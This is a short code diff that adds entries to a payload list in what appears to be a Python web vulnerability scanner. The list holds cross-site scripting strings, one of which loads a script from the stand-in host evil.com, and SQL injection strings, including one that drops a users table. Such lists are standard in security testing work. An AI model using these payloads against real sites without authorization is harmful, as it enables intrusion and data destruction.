@@ -7,7 +7,7 @@ HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.
 # Payloads mở rộng
 PAYLOADS = {
     "XSS": [
-        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
+        "<script>alert('XSS')</script>","<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
         "'><script>alert(1)</script>", "javascript:alert('XSS')",
         "<svg onload=alert(1)>", "<iframe src=javascript:alert(1)>",
         "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
@@ -15,7 +15,7 @@ PAYLOADS = {
         "<script/src=//evil.com/xss.js></script>", "<details open ontoggle=alert(1)>"
     ],
     "SQLi": [
-        "' OR '1'='1", "1' UNION SELECT NULL,version()--", "' OR SLEEP(5)--",
+        "' OR '1'='1","admin' OR 1=1 #", "1' UNION SELECT NULL,version()--", "' OR SLEEP(5)--",
         "1; DROP TABLE users--", "' AND 1=CONVERT(int,@@version)--",
         "admin' OR '1'='1'#", "1' WAITFOR DELAY '0:0:5'--",
         "' OR 1=1 LIMIT 1--", "1' AND SUBSTRING(@@version,1,1)='5'",
